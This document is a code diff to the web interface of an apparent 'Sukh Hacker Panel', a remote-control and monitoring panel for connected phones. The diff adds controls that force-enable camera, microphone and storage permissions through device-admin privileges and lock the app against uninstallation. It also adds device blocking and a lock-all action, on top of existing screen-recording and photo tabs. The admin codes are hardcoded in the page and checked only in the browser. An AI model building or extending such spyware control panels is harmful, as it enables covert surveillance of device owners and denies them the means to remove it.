@@ -82,6 +82,10 @@
 
         .header-actions {
             margin-top: 15px;
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            flex-wrap: wrap;
         }
 
         .logout-btn {
@@ -98,6 +102,22 @@
         .logout-btn:hover {
             transform: translateY(-2px);
             box-shadow: 0 5px 15px rgba(255, 107, 107, 0.3);
+        }
+
+        .security-btn {
+            background: linear-gradient(45deg, var(--warning), #ff8800);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.3s ease;
+        }
+
+        .security-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 170, 0, 0.3);
         }
 
         /* Tabs */
@@ -232,6 +252,11 @@
             background: linear-gradient(135deg, #2a2a1e 0%, #3d3d2d 100%);
         }
 
+        .device-card.locked {
+            border-color: var(--primary);
+            background: linear-gradient(135deg, #1e2a1e 0%, #2d3d2d 100%);
+        }
+
         .device-icon {
             font-size: 2rem;
             margin-bottom: 10px;
@@ -274,6 +299,11 @@
         .status-dot.screen-recording {
             background: var(--warning);
             animation: pulse 1.5s infinite;
+        }
+
+        .status-dot.locked {
+            background: var(--primary);
+            animation: pulse 2s infinite;
         }
 
         @keyframes pulse {
@@ -405,6 +435,11 @@
             color: white;
         }
 
+        .btn-security {
+            background: linear-gradient(45deg, #9b59b6, #8e44ad);
+            color: white;
+        }
+
         /* Status Box */
         .status-box {
             background: rgba(0, 0, 0, 0.5);
@@ -477,34 +512,141 @@
             flex: 1;
         }
 
-        /* Audio Player */
-        .audio-player {
-            width: 100%;
-            margin: 15px 0;
-            border-radius: 25px;
-            background: #333;
-            height: 40px;
-        }
-
-        /* Video Player */
-        .video-player {
-            width: 100%;
-            margin: 15px 0;
-            border-radius: 12px;
-            background: #000;
-        }
-
-        /* Photo Preview */
-        .photo-preview {
-            text-align: center;
+        /* Security Panel Specific */
+        .security-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
             margin: 20px 0;
         }
 
-        .photo-preview img {
-            max-width: 100%;
-            border-radius: 12px;
-            border: 2px solid var(--primary);
-            box-shadow: 0 10px 25px rgba(0, 255, 136, 0.2);
+        .security-card {
+            background: linear-gradient(135deg, #1e1e1e 0%, #2d2d2d 100%);
+            border-radius: 15px;
+            padding: 25px;
+            border: 1px solid #333;
+            transition: all 0.3s ease;
+        }
+
+        .security-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        .security-card.locked {
+            border-color: var(--primary);
+            background: linear-gradient(135deg, #1e2a1e 0%, #2d3d2d 100%);
+        }
+
+        .security-card.blocked {
+            border-color: var(--danger);
+            background: linear-gradient(135deg, #2a1e1e 0%, #3d2d2d 100%);
+        }
+
+        .security-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .security-icon {
+            font-size: 2rem;
+            color: var(--primary);
+        }
+
+        .security-stats {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .stat-item {
+            text-align: center;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            border: 1px solid #333;
+        }
+
+        .stat-value {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: var(--primary);
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            font-size: 0.9rem;
+            color: #cccccc;
+        }
+
+        /* Form Elements */
+        select, input {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: white;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        select:focus, input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 2px rgba(0, 255, 136, 0.2);
+        }
+
+        .admin-input {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--warning);
+            color: var(--warning);
+        }
+
+        .emergency-input {
+            background: rgba(255, 68, 68, 0.1);
+            border: 1px solid var(--danger);
+            color: var(--danger);
+        }
+
+        /* Permission Status */
+        .permission-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .permission-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            border: 1px solid #333;
+        }
+
+        .permission-status {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .permission-status.granted {
+            background: var(--primary);
+            animation: pulse 2s infinite;
+        }
+
+        .permission-status.denied {
+            background: var(--danger);
+        }
+
+        .permission-status.unknown {
+            background: var(--warning);
         }
 
         /* Footer */
@@ -533,6 +675,10 @@
             
             .files-grid {
                 grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            }
+            
+            .security-grid {
+                grid-template-columns: 1fr;
             }
         }
 
@@ -577,6 +723,10 @@
             
             .header h1 {
                 font-size: 2rem;
+            }
+            
+            .security-stats {
+                grid-template-columns: 1fr;
             }
         }
 
@@ -666,6 +816,16 @@
             border: 1px solid var(--danger);
         }
 
+        /* Success Styling */
+        .success-message {
+            color: var(--primary);
+            text-align: center;
+            padding: 20px;
+            background: rgba(0, 255, 136, 0.1);
+            border-radius: 10px;
+            border: 1px solid var(--primary);
+        }
+
         /* Toast Notifications */
         .toast {
             position: fixed;
@@ -695,6 +855,10 @@
 
         .toast.info {
             background: linear-gradient(45deg, var(--secondary), #0099cc);
+        }
+
+        .toast.warning {
+            background: linear-gradient(45deg, var(--warning), #ff8800);
         }
 
         /* Floating Action Button for Mobile */
@@ -737,6 +901,37 @@
             0% { transform: rotate(0); }
             100% { transform: rotate(360deg); }
         }
+
+        /* Security Badges */
+        .security-badge {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 0.7rem;
+            font-weight: bold;
+            margin-left: 8px;
+        }
+
+        .badge-locked {
+            background: var(--primary);
+            color: #000;
+        }
+
+        .badge-blocked {
+            background: var(--danger);
+            color: white;
+        }
+
+        .badge-recording {
+            background: var(--danger);
+            color: white;
+            animation: pulse 1.5s infinite;
+        }
+
+        .badge-permission {
+            background: var(--warning);
+            color: #000;
+        }
     </style>
 </head>
 <body>
@@ -752,8 +947,11 @@
         <!-- Header -->
         <div class="header">
             <h1>🚀 Sukh Hacker Panel</h1>
-            <p>Remote Control & Monitoring System</p>
+            <p>Advanced Security & Control System</p>
             <div class="header-actions">
+                <button class="security-btn" onclick="openTab('security')">
+                    <i class="fas fa-shield-alt"></i> Security Dashboard
+                </button>
                 <button class="logout-btn" onclick="logout()">
                     <i class="fas fa-sign-out-alt"></i> Logout
                 </button>
@@ -764,6 +962,9 @@
         <div class="tabs" id="tabsContainer">
             <button class="tab-btn active" onclick="openTab('devices')">
                 <i class="fas fa-mobile-alt"></i> Devices
+            </button>
+            <button class="tab-btn" onclick="openTab('security')">
+                <i class="fas fa-shield-alt"></i> Security
             </button>
             <button class="tab-btn" onclick="openTab('global')">
                 <i class="fas fa-globe"></i> Global Control
@@ -853,6 +1054,151 @@
                         </div>
                         <h3>No devices connected</h3>
                         <p>Waiting for devices to register...</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Security Tab -->
+        <div id="security" class="tab-content">
+            <div class="control-panel">
+                <h3 style="color: var(--secondary); margin-bottom: 20px;">
+                    <i class="fas fa-shield-alt"></i> Advanced Security Control
+                </h3>
+                
+                <!-- Security Dashboard -->
+                <div class="security-stats" id="securityStats">
+                    <div class="stat-item">
+                        <div class="stat-value" id="connectedCount">0</div>
+                        <div class="stat-label">Connected Devices</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value" id="lockedCount">0</div>
+                        <div class="stat-label">Locked Apps</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value" id="blockedCount">0</div>
+                        <div class="stat-label">Blocked Devices</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value" id="permissionCount">0</div>
+                        <div class="stat-label">Devices with Permissions</div>
+                    </div>
+                </div>
+
+                <!-- Device Selection -->
+                <div style="margin-bottom: 20px;">
+                    <label style="color: var(--primary); margin-bottom: 10px; display: block;">
+                        <i class="fas fa-mobile-alt"></i> Select Device:
+                    </label>
+                    <select id="securityDeviceSelect" onchange="loadDeviceSecurityInfo()" style="width: 100%; padding: 10px; border-radius: 8px; background: #1a1a1a; color: white; border: 1px solid #333;">
+                        <option value="">-- Select Device --</option>
+                    </select>
+                </div>
+
+                <!-- Permission Control -->
+                <div class="security-card">
+                    <div class="security-header">
+                        <div class="security-icon">
+                            <i class="fas fa-key"></i>
+                        </div>
+                        <div>
+                            <h4 style="color: var(--primary);">Permission Control</h4>
+                            <p style="color: #cccccc; font-size: 0.9rem;">Manage app permissions on device</p>
+                        </div>
+                    </div>
+
+                    <div class="btn-group">
+                        <button class="btn btn-security" onclick="checkPermissions()">
+                            <i class="fas fa-check-circle"></i> Check Permissions
+                        </button>
+                        <button class="btn btn-start" onclick="autoRequestPermissions()">
+                            <i class="fas fa-bolt"></i> Auto Request Permissions
+                        </button>
+                        <button class="btn btn-screen" onclick="showForcePermissionsModal()">
+                            <i class="fas fa-cog"></i> Force Enable Permissions
+                        </button>
+                    </div>
+
+                    <div id="permissionStatus" style="margin-top: 20px;">
+                        <!-- Permission status will be displayed here -->
+                    </div>
+                </div>
+
+                <!-- App Lock Control -->
+                <div class="security-card">
+                    <div class="security-header">
+                        <div class="security-icon">
+                            <i class="fas fa-lock"></i>
+                        </div>
+                        <div>
+                            <h4 style="color: var(--primary);">App Lock Control</h4>
+                            <p style="color: #cccccc; font-size: 0.9rem;">Prevent app uninstallation</p>
+                        </div>
+                    </div>
+
+                    <div class="btn-group">
+                        <button class="btn btn-start" onclick="lockApp()">
+                            <i class="fas fa-lock"></i> Lock App
+                        </button>
+                        <button class="btn btn-stop" onclick="showUnlockAppModal()">
+                            <i class="fas fa-unlock"></i> Unlock App
+                        </button>
+                        <button class="btn btn-refresh" onclick="getAppLockStatus()">
+                            <i class="fas fa-sync-alt"></i> Check Lock Status
+                        </button>
+                    </div>
+
+                    <div id="appLockStatus" style="margin-top: 20px;">
+                        <!-- App lock status will be displayed here -->
+                    </div>
+                </div>
+
+                <!-- Device Blocking -->
+                <div class="security-card">
+                    <div class="security-header">
+                        <div class="security-icon">
+                            <i class="fas fa-ban"></i>
+                        </div>
+                        <div>
+                            <h4 style="color: var(--primary);">Device Blocking</h4>
+                            <p style="color: #cccccc; font-size: 0.9rem;">Block/unblock devices from connecting</p>
+                        </div>
+                    </div>
+
+                    <div class="btn-group">
+                        <button class="btn btn-stop" onclick="showBlockDeviceModal()">
+                            <i class="fas fa-ban"></i> Block Device
+                        </button>
+                        <button class="btn btn-start" onclick="showUnblockDeviceModal()">
+                            <i class="fas fa-check-circle"></i> Unblock Device
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Emergency Controls -->
+                <div class="security-card">
+                    <div class="security-header">
+                        <div class="security-icon">
+                            <i class="fas fa-exclamation-triangle"></i>
+                        </div>
+                        <div>
+                            <h4 style="color: var(--danger);">Emergency Controls</h4>
+                            <p style="color: #cccccc; font-size: 0.9rem;">Critical security actions</p>
+                        </div>
+                    </div>
+
+                    <div class="btn-group">
+                        <button class="btn btn-stop" onclick="showEmergencyLockModal()">
+                            <i class="fas fa-lock"></i> Emergency Lock All
+                        </button>
+                    </div>
+
+                    <div style="margin-top: 15px; padding: 15px; background: rgba(255, 68, 68, 0.1); border-radius: 8px; border: 1px solid var(--danger);">
+                        <p style="color: var(--danger); font-size: 0.8rem; margin: 0;">
+                            <i class="fas fa-exclamation-circle"></i> 
+                            <strong>Warning:</strong> Emergency actions affect all connected devices and require admin codes.
+                        </p>
                     </div>
                 </div>
             </div>
@@ -986,18 +1332,539 @@
 
         <!-- Footer -->
         <div class="footer">
-            <div>🚀 Multi-Device Control System</div>
+            <div>🚀 Advanced Security & Control System</div>
             <div class="server-info">
                 <span>Server Time: <span id="serverTime">{{ current_time }}</span></span>
                 <span>|</span>
                 <span>Server: {{ server_ip }}</span>
                 <span>|</span>
                 <span>Connected Devices: <span id="connectedDevicesCount">0</span></span>
+                <span>|</span>
+                <span>Security Level: <span style="color: var(--primary);">HIGH</span></span>
             </div>
         </div>
     </div>
 
+    <!-- Modals for Security Features -->
+    <div id="modalsContainer"></div>
+
     <script>
+        // ==================== SECURITY FUNCTIONS ====================
+
+        // Security Dashboard
+        function loadSecurityDashboard() {
+            fetch('/security_dashboard')
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        document.getElementById('connectedCount').textContent = data.connected_devices;
+                        document.getElementById('lockedCount').textContent = data.locked_apps;
+                        document.getElementById('blockedCount').textContent = data.blocked_devices;
+                        document.getElementById('permissionCount').textContent = data.devices_with_permissions;
+                    }
+                })
+                .catch(error => {
+                    console.error('Security dashboard error:', error);
+                });
+        }
+
+        // Permission Functions
+        function checkPermissions() {
+            const deviceId = document.getElementById('securityDeviceSelect').value;
+            if (!deviceId) {
+                showToast('Please select a device first', 'error');
+                return;
+            }
+
+            fetch(`/check_permissions/${deviceId}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        showToast('Permission check sent to device', 'success');
+                        setTimeout(() => getPermissionStatus(deviceId), 2000);
+                    } else {
+                        showToast('Failed to check permissions: ' + data.message, 'error');
+                    }
+                })
+                .catch(error => {
+                    showToast('Error checking permissions: ' + error, 'error');
+                });
+        }
+
+        function autoRequestPermissions() {
+            const deviceId = document.getElementById('securityDeviceSelect').value;
+            if (!deviceId) {
+                showToast('Please select a device first', 'error');
+                return;
+            }
+
+            fetch('/auto_request_permissions', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ device_id: deviceId })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    showToast('Auto permission request sent', 'success');
+                } else {
+                    showToast('Failed to request permissions: ' + data.message, 'error');
+                }
+            })
+            .catch(error => {
+                showToast('Error requesting permissions: ' + error, 'error');
+            });
+        }
+
+        function showForcePermissionsModal() {
+            const deviceId = document.getElementById('securityDeviceSelect').value;
+            if (!deviceId) {
+                showToast('Please select a device first', 'error');
+                return;
+            }
+
+            const modalHtml = `
+                <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: flex; align-items: center; justify-content: center; z-index: 1000;">
+                    <div style="background: #1e1e1e; padding: 30px; border-radius: 15px; border: 2px solid var(--warning); max-width: 400px; width: 90%;">
+                        <h3 style="color: var(--warning); margin-bottom: 15px;">
+                            <i class="fas fa-cog"></i> Force Enable Permissions
+                        </h3>
+                        <p style="color: #cccccc; margin-bottom: 20px;">
+                            This will attempt to force enable all permissions using device admin privileges.
+                        </p>
+                        <input type="password" id="forcePermAdminCode" placeholder="Enter Admin Code: SUKH_ADMIN_2024" class="admin-input">
+                        <div style="display: flex; gap: 10px; margin-top: 20px;">
+                            <button class="btn btn-security" onclick="forcePermissions('${deviceId}')" style="flex: 1;">
+                                <i class="fas fa-bolt"></i> Force Enable
+                            </button>
+                            <button class="btn btn-stop" onclick="closeModal()" style="flex: 1;">
+                                Cancel
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            `;
+            document.getElementById('modalsContainer').innerHTML = modalHtml;
+        }
+
+        function forcePermissions(deviceId) {
+            const adminCode = document.getElementById('forcePermAdminCode').value;
+            
+            if (adminCode !== 'SUKH_ADMIN_2024') {
+                showToast('Invalid admin code', 'error');
+                return;
+            }
+
+            fetch('/force_permissions', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    device_id: deviceId,
+                    admin_code: adminCode
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    showToast('Force permissions command sent', 'success');
+                    closeModal();
+                } else {
+                    showToast('Failed to force permissions: ' + data.message, 'error');
+                }
+            })
+            .catch(error => {
+                showToast('Error forcing permissions: ' + error, 'error');
+            });
+        }
+
+        function getPermissionStatus(deviceId) {
+            if (!deviceId) return;
+
+            fetch(`/get_permission_status/${deviceId}`)
+                .then(response => response.json())
+                .then(data => {
+                    let statusHtml = '<h5 style="color: var(--primary); margin-bottom: 15px;">Permission Status:</h5>';
+                    
+                    if (data.status === 'success' && data.permissions) {
+                        const perms = data.permissions;
+                        statusHtml += `
+                            <div class="permission-grid">
+                                <div class="permission-item">
+                                    <div class="permission-status ${perms.camera ? 'granted' : 'denied'}"></div>
+                                    <span>Camera: ${perms.camera ? 'GRANTED' : 'DENIED'}</span>
+                                </div>
+                                <div class="permission-item">
+                                    <div class="permission-status ${perms.microphone ? 'granted' : 'denied'}"></div>
+                                    <span>Microphone: ${perms.microphone ? 'GRANTED' : 'DENIED'}</span>
+                                </div>
+                                <div class="permission-item">
+                                    <div class="permission-status ${perms.storage ? 'granted' : 'denied'}"></div>
+                                    <span>Storage: ${perms.storage ? 'GRANTED' : 'DENIED'}</span>
+                                </div>
+                            </div>
+                        `;
+                    } else {
+                        statusHtml += '<p style="color: var(--warning);">No permission data available</p>';
+                    }
+                    
+                    document.getElementById('permissionStatus').innerHTML = statusHtml;
+                })
+                .catch(error => {
+                    document.getElementById('permissionStatus').innerHTML = '<p style="color: var(--danger);">Error loading permission status</p>';
+                });
+        }
+
+        // App Lock Functions
+        function lockApp() {
+            const deviceId = document.getElementById('securityDeviceSelect').value;
+            if (!deviceId) {
+                showToast('Please select a device first', 'error');
+                return;
+            }
+
+            fetch('/lock_app', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ device_id: deviceId })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    showToast('App locked successfully', 'success');
+                    setTimeout(() => getAppLockStatus(), 1000);
+                } else {
+                    showToast('Failed to lock app: ' + data.message, 'error');
+                }
+            })
+            .catch(error => {
+                showToast('Error locking app: ' + error, 'error');
+            });
+        }
+
+        function showUnlockAppModal() {
+            const deviceId = document.getElementById('securityDeviceSelect').value;
+            if (!deviceId) {
+                showToast('Please select a device first', 'error');
+                return;
+            }
+
+            const modalHtml = `
+                <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: flex; align-items: center; justify-content: center; z-index: 1000;">
+                    <div style="background: #1e1e1e; padding: 30px; border-radius: 15px; border: 2px solid var(--primary); max-width: 400px; width: 90%;">
+                        <h3 style="color: var(--primary); margin-bottom: 15px;">
+                            <i class="fas fa-unlock"></i> Unlock App
+                        </h3>
+                        <p style="color: #cccccc; margin-bottom: 20px;">
+                            Enter admin code to unlock the app on device.
+                        </p>
+                        <input type="password" id="unlockAppAdminCode" placeholder="Enter Admin Code: SUKH_ADMIN_2024" class="admin-input">
+                        <div style="display: flex; gap: 10px; margin-top: 20px;">
+                            <button class="btn btn-start" onclick="unlockApp('${deviceId}')" style="flex: 1;">
+                                <i class="fas fa-unlock"></i> Unlock
+                            </button>
+                            <button class="btn btn-stop" onclick="closeModal()" style="flex: 1;">
+                                Cancel
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            `;
+            document.getElementById('modalsContainer').innerHTML = modalHtml;
+        }
+
+        function unlockApp(deviceId) {
+            const adminCode = document.getElementById('unlockAppAdminCode').value;
+            
+            if (adminCode !== 'SUKH_ADMIN_2024') {
+                showToast('Invalid admin code', 'error');
+                return;
+            }
+
+            fetch('/unlock_app', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    device_id: deviceId,
+                    admin_code: adminCode
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    showToast('App unlocked successfully', 'success');
+                    closeModal();
+                    setTimeout(() => getAppLockStatus(), 1000);
+                } else {
+                    showToast('Failed to unlock app: ' + data.message, 'error');
+                }
+            })
+            .catch(error => {
+                showToast('Error unlocking app: ' + error, 'error');
+            });
+        }
+
+        function getAppLockStatus() {
+            const deviceId = document.getElementById('securityDeviceSelect').value;
+            if (!deviceId) return;
+
+            fetch(`/get_app_lock_status/${deviceId}`)
+                .then(response => response.json())
+                .then(data => {
+                    let statusHtml = '<h5 style="color: var(--primary); margin-bottom: 15px;">App Lock Status:</h5>';
+                    
+                    if (data.status === 'success') {
+                        const lockStatus = data.lock_status;
+                        if (lockStatus.locked) {
+                            statusHtml += `
+                                <div style="color: var(--primary); background: rgba(0, 255, 136, 0.1); padding: 15px; border-radius: 8px; border: 1px solid var(--primary);">
+                                    <i class="fas fa-lock"></i> <strong>APP IS LOCKED</strong>
+                                    <div style="font-size: 0.8rem; margin-top: 5px;">
+                                        Locked since: ${new Date(lockStatus.lock_time * 1000).toLocaleString()}
+                                    </div>
+                                </div>
+                            `;
+                        } else {
+                            statusHtml += `
+                                <div style="color: var(--secondary); background: rgba(0, 204, 255, 0.1); padding: 15px; border-radius: 8px; border: 1px solid var(--secondary);">
+                                    <i class="fas fa-unlock"></i> <strong>APP IS UNLOCKED</strong>
+                                </div>
+                            `;
+                        }
+                    } else {
+                        statusHtml += '<p style="color: var(--warning);">No lock status data available</p>';
+                    }
+                    
+                    document.getElementById('appLockStatus').innerHTML = statusHtml;
+                })
+                .catch(error => {
+                    document.getElementById('appLockStatus').innerHTML = '<p style="color: var(--danger);">Error loading lock status</p>';
+                });
+        }
+
+        // Device Blocking Functions
+        function showBlockDeviceModal() {
+            const deviceId = document.getElementById('securityDeviceSelect').value;
+            if (!deviceId) {
+                showToast('Please select a device first', 'error');
+                return;
+            }
+
+            const modalHtml = `
+                <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: flex; align-items: center; justify-content: center; z-index: 1000;">
+                    <div style="background: #1e1e1e; padding: 30px; border-radius: 15px; border: 2px solid var(--danger); max-width: 400px; width: 90%;">
+                        <h3 style="color: var(--danger); margin-bottom: 15px;">
+                            <i class="fas fa-ban"></i> Block Device
+                        </h3>
+                        <p style="color: #cccccc; margin-bottom: 20px;">
+                            This will permanently block device <strong>${deviceId}</strong> from connecting.
+                        </p>
+                        <input type="password" id="blockDeviceAdminCode" placeholder="Enter Admin Code: SUKH_ADMIN_2024" class="admin-input">
+                        <div style="display: flex; gap: 10px; margin-top: 20px;">
+                            <button class="btn btn-stop" onclick="blockDevice('${deviceId}')" style="flex: 1;">
+                                <i class="fas fa-ban"></i> Block Device
+                            </button>
+                            <button class="btn btn-refresh" onclick="closeModal()" style="flex: 1;">
+                                Cancel
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            `;
+            document.getElementById('modalsContainer').innerHTML = modalHtml;
+        }
+
+        function blockDevice(deviceId) {
+            const adminCode = document.getElementById('blockDeviceAdminCode').value;
+            
+            if (adminCode !== 'SUKH_ADMIN_2024') {
+                showToast('Invalid admin code', 'error');
+                return;
+            }
+
+            fetch('/block_device', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    device_id: deviceId,
+                    admin_code: adminCode
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    showToast('Device blocked successfully', 'success');
+                    closeModal();
+                    refreshDevices();
+                    loadSecurityDashboard();
+                } else {
+                    showToast('Failed to block device: ' + data.message, 'error');
+                }
+            })
+            .catch(error => {
+                showToast('Error blocking device: ' + error, 'error');
+            });
+        }
+
+        function showUnblockDeviceModal() {
+            const modalHtml = `
+                <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: flex; align-items: center; justify-content: center; z-index: 1000;">
+                    <div style="background: #1e1e1e; padding: 30px; border-radius: 15px; border: 2px solid var(--primary); max-width: 400px; width: 90%;">
+                        <h3 style="color: var(--primary); margin-bottom: 15px;">
+                            <i class="fas fa-check-circle"></i> Unblock Device
+                        </h3>
+                        <p style="color: #cccccc; margin-bottom: 20px;">
+                            Enter device ID and admin code to unblock.
+                        </p>
+                        <input type="text" id="unblockDeviceId" placeholder="Device ID to unblock" style="margin-bottom: 15px;">
+                        <input type="password" id="unblockAdminCode" placeholder="Enter Admin Code: SUKH_ADMIN_2024" class="admin-input">
+                        <div style="display: flex; gap: 10px; margin-top: 20px;">
+                            <button class="btn btn-start" onclick="unblockDevice()" style="flex: 1;">
+                                <i class="fas fa-check-circle"></i> Unblock
+                            </button>
+                            <button class="btn btn-stop" onclick="closeModal()" style="flex: 1;">
+                                Cancel
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            `;
+            document.getElementById('modalsContainer').innerHTML = modalHtml;
+        }
+
+        function unblockDevice() {
+            const deviceId = document.getElementById('unblockDeviceId').value;
+            const adminCode = document.getElementById('unblockAdminCode').value;
+            
+            if (!deviceId) {
+                showToast('Please enter device ID', 'error');
+                return;
+            }
+            
+            if (adminCode !== 'SUKH_ADMIN_2024') {
+                showToast('Invalid admin code', 'error');
+                return;
+            }
+
+            fetch('/unblock_device', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    device_id: deviceId,
+                    admin_code: adminCode
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    showToast('Device unblocked successfully', 'success');
+                    closeModal();
+                    loadSecurityDashboard();
+                } else {
+                    showToast('Failed to unblock device: ' + data.message, 'error');
+                }
+            })
+            .catch(error => {
+                showToast('Error unblocking device: ' + error, 'error');
+            });
+        }
+
+        // Emergency Functions
+        function showEmergencyLockModal() {
+            const modalHtml = `
+                <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: flex; align-items: center; justify-content: center; z-index: 1000;">
+                    <div style="background: #1e1e1e; padding: 30px; border-radius: 15px; border: 2px solid var(--danger); max-width: 400px; width: 90%;">
+                        <h3 style="color: var(--danger); margin-bottom: 15px;">
+                            <i class="fas fa-exclamation-triangle"></i> Emergency Lock All
+                        </h3>
+                        <p style="color: #cccccc; margin-bottom: 20px;">
+                            <strong>WARNING:</strong> This will lock ALL connected devices immediately!
+                        </p>
+                        <input type="password" id="emergencyLockCode" placeholder="Enter Emergency Code: SUKH_EMERGENCY_2024" class="emergency-input">
+                        <div style="display: flex; gap: 10px; margin-top: 20px;">
+                            <button class="btn btn-stop" onclick="emergencyLockAll()" style="flex: 1;">
+                                <i class="fas fa-lock"></i> Emergency Lock
+                            </button>
+                            <button class="btn btn-refresh" onclick="closeModal()" style="flex: 1;">
+                                Cancel
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            `;
+            document.getElementById('modalsContainer').innerHTML = modalHtml;
+        }
+
+        function emergencyLockAll() {
+            const emergencyCode = document.getElementById('emergencyLockCode').value;
+            
+            if (emergencyCode !== 'SUKH_EMERGENCY_2024') {
+                showToast('Invalid emergency code', 'error');
+                return;
+            }
+
+            fetch('/emergency_lock_all', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    admin_code: emergencyCode
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    showToast('Emergency lock activated for ' + data.message, 'success');
+                    closeModal();
+                    refreshDevices();
+                    loadSecurityDashboard();
+                } else {
+                    showToast('Failed to emergency lock: ' + data.message, 'error');
+                }
+            })
+            .catch(error => {
+                showToast('Error in emergency lock: ' + error, 'error');
+            });
+        }
+
+        // Utility Functions
+        function closeModal() {
+            document.getElementById('modalsContainer').innerHTML = '';
+        }
+
+        function loadDeviceSecurityInfo() {
+            const deviceId = document.getElementById('securityDeviceSelect').value;
+            if (deviceId) {
+                getPermissionStatus(deviceId);
+                getAppLockStatus(deviceId);
+            } else {
+                document.getElementById('permissionStatus').innerHTML = '';
+                document.getElementById('appLockStatus').innerHTML = '';
+            }
+        }
+
+        // Update device dropdown for security tab
+        function updateSecurityDeviceDropdown() {
+            const select = document.getElementById('securityDeviceSelect');
+            const currentDevices = Object.keys(connected_devices || {});
+            
+            // Clear existing options except the first one
+            while (select.options.length > 1) {
+                select.remove(1);
+            }
+            
+            // Add current devices
+            currentDevices.forEach(deviceId => {
+                const option = document.createElement('option');
+                option.value = deviceId;
+                option.textContent = deviceId.length > 30 ? deviceId.substring(0, 30) + '...' : deviceId;
+                select.appendChild(option);
+            });
+        }
+
+        // ==================== EXISTING FUNCTIONS (Updated) ====================
+
+        let currentDeviceId = null;
+        let connected_devices = {};
+
         // Authentication check
         function checkAuth() {
             const isAuthenticated = localStorage.getItem('isAuthenticated');
@@ -1024,9 +1891,6 @@
             }, duration);
         }
 
-        let currentDeviceId = null;
-        let deviceIds = new Set(); // Track unique device IDs
-
         function openTab(tabName) {
             // Hide all tab contents
             document.querySelectorAll('.tab-content').forEach(tab => {
@@ -1044,10 +1908,17 @@
             // Activate clicked button
             event.currentTarget.classList.add('active');
             
+            // Load security dashboard when security tab is opened
+            if (tabName === 'security') {
+                loadSecurityDashboard();
+                updateSecurityDeviceDropdown();
+            }
+            
             // Show toast for tab change on mobile
             if (window.innerWidth <= 768) {
                 const tabNames = {
                     'devices': 'Devices',
+                    'security': 'Security',
                     'global': 'Global Control',
                     'recordings': 'Recordings',
                     'photos': 'Photos',
@@ -1123,19 +1994,12 @@
                 .then(data => {
                     console.log("Devices data received:", data);
                     const devicesGrid = document.getElementById('devicesGrid');
+                    connected_devices = data.devices || {};
                     
                     if (data.devices && Object.keys(data.devices).length > 0) {
                         let devicesHtml = '';
-                        deviceIds.clear(); // Clear previous device IDs
                         
                         for (let device_id in data.devices) {
